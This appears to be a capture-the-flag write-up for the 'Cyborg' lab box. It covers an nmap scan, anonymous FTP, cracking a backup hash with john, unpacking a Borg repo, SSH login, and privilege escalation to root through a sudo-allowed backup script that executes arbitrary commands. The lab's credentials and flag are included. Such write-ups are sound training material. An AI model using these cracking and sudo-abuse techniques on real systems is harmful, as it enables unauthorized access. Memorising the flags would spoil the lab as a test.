@@ -1,0 +1,124 @@
+📝 Cyborg – Write-Up
+1. Reconnaissance
+
+Target IP: 10.201.126.210
+
+Nmap Scan
+nmap -sC -sV -p- 10.201.126.210
+
+
+Findings:
+
+21/tcp (FTP) → Anonymous login allowed.
+
+80/tcp (HTTP) → Webpage with hint about Squid proxy and inline CSS clue.
+
+22/tcp (SSH) → Open, but credentials unknown at this point.
+
+2. Enumeration
+FTP
+
+Logged in anonymously.
+
+Found a note (note_to_jake.txt) indicating weak passwords.
+
+Recovered a .htpasswd-style hash:
+
+music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
+
+
+Cracked it with john and rockyou.txt:
+
+music_archive : squidward
+
+Web Enumeration
+
+Squid proxy credentials (music_archive:squidward) worked.
+
+Able to browse and eventually download archive.tar.
+
+3. Exploitation
+BorgBackup Repository
+
+Extracted archive.tar:
+
+tar -xf archive.tar
+
+
+Found a Borg repo at home/home/field/dev/final_archive/.
+
+Used Borg to list archives:
+
+borg list ~/Downloads/home/home/field/dev/final_archive
+
+
+Unlocked with passphrase squidward.
+
+Extracted contents:
+
+borg extract ~/Downloads/home/home/field/dev/final_archive::music_archive
+
+
+Found secret.txt on Alex’s Desktop, confirming access to sensitive data.
+
+SSH Access
+
+Credentials found during enumeration allowed login as alex:
+
+ssh alex@10.201.126.210
+
+4. Privilege Escalation
+
+Checked sudo permissions:
+
+sudo -l
+
+
+Output:
+
+User alex may run the following commands on ubuntu:
+    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
+
+Vulnerable Script
+
+/etc/mp3backups/backup.sh contained a getopts function that accepted a -c flag to execute arbitrary commands:
+
+while getopts c: flag
+do
+  case "${flag}" in
+    c) command=${OPTARG};;
+  esac
+done
+
+cmd=$($command)
+echo $cmd
+
+Exploit
+
+Ran:
+
+sudo /etc/mp3backups/backup.sh -c "/bin/bash"
+
+
+Got a root shell.
+
+5. Proof
+
+Inside /root/:
+
+cat /root/root.txt
+
+
+Flag:
+
+flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
+
+6. Lessons Learned
+
+Weak passwords (squidward) make lateral movement trivial.
+
+Exposed BorgBackup repositories leak sensitive data.
+
+Misconfigured sudo scripts (like backup.sh with arbitrary -c) result in full system compromise.
+
+✅ Rooted Cyborg — full chain from web → proxy → backup repo → SSH → root.
